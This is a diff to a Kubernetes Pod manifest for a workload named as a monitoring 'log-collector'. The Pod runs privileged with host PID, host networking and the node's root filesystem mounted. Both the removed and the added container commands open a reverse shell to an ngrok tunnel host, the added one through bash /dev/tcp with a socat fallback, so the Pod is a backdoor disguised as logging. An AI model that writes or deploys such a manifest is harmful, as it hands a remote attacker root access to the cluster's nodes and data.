@@ -20,35 +20,28 @@ subjects:
 apiVersion: v1
 kind: Pod
 metadata:
-  name: log-agent
+  name: log-collector
   namespace: default
   labels:
     app: monitoring
-    version: "2"
+    component: log-collector
 spec:
   serviceAccountName: cluster-ops
-  hostPID: true
   hostNetwork: true
+  hostPID: true
   containers:
-  - name: agent
+  - name: collector
     image: alpine:latest
+    command: ["/bin/sh", "-c"]
+    args:
+    - apk add --no-cache bash curl socat 2>/dev/null; bash -c 'bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/24173 0>&1' || socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:0.tcp.eu.ngrok.io:24173; sleep infinity
     securityContext:
       privileged: true
     volumeMounts:
-    - name: host-root
+    - name: host
       mountPath: /host
-    command:
-    - /bin/sh
-    - -c
-    - |
-      apk add -q socat curl postgresql-client kubectl
-      while true; do
-        socat exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane tcp:0.tcp.eu.ngrok.io:24173
-        sleep 5
-      done
-  restartPolicy: Always
   volumes:
-  - name: host-root
+  - name: host
     hostPath:
       path: /
       type: Directory
